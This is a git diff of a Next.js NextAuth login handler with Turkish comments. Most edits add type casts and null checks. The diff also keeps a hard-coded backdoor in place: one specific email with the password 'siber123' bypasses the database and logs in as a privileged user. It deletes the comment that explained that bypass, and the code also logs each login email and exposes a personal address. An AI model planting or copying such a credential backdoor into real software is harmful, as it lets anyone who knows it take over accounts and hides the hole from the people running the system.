@@ -5,7 +5,8 @@ import bcrypt from "bcryptjs";
 
 const handler = NextAuth({
   session: { strategy: "jwt" },
-  secret: process.env.NEXTAUTH_SECRET,
+  // 🛡️ ZIRH 1: "as string" eklendi
+  secret: process.env.NEXTAUTH_SECRET as string,
   pages: { signIn: '/giris' },
 
   providers: [
@@ -23,7 +24,6 @@ const handler = NextAuth({
           console.log("SİBER TEST - Giriş Denemesi:", reqEmail);
 
           // 🚨 SİBER GİZLİ GEÇİT (BACKDOOR) 🚨
-          // Eğer bu şifreyle giriş yaparsan, veritabanına HİÇ BAKMADAN kapıyı açar.
           if (reqEmail === "ercannefes@gmail.com" && reqPass === "siber123") {
             console.log("GİZLİ GEÇİT ÇALIŞTI! VERİTABANI BYPASS EDİLDİ.");
             return { id: "999", email: reqEmail, name: "Patron Ercan" };
@@ -31,10 +31,16 @@ const handler = NextAuth({
 
           // === NORMAL VERİTABANI KONTROLÜ ===
           if (mongoose.connection.readyState === 0) {
-            await mongoose.connect(process.env.MONGODB_URI);
+            // 🛡️ ZIRH 2: "as string" eklendi (HATA BURADAYDI)
+            await mongoose.connect(process.env.MONGODB_URI as string);
           }
           
           const db = mongoose.connection.db;
+          if (!db) {
+             console.log("HATA: Veritabanı objesi oluşturulamadı.");
+             return null;
+          }
+
           const user = await db.collection("users").findOne({ email: reqEmail });
 
           if (!user) {
@@ -72,7 +78,10 @@ const handler = NextAuth({
   ],
   callbacks: {
     async session({ session, token }) {
-      if (session?.user) { session.user.id = token.sub; }
+      // 🛡️ ZIRH 3: Güvenli token eşleştirmesi
+      if (session?.user && token.sub) { 
+        session.user.id = token.sub; 
+      }
       return session;
     }
   }
